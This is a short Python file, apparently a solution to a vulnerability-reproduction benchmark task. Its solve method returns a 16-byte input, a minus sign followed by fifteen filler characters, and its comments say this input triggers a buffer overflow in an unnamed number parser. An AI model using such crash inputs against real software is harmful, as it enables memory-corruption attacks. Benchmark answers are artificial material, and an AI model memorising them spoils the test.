import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth length is 16 bytes
        # Based on vulnerability description: leading minus sign causes parsing to advance
        # even when not an infinity value, leading to buffer overflow
        # Create PoC: "-" followed by 15 non-infinity characters
        # The exact pattern doesn't matter as much as triggering the overflow
        poc = b"-XXXXXXXXXXXXXXX"  # 16 bytes total
        return poc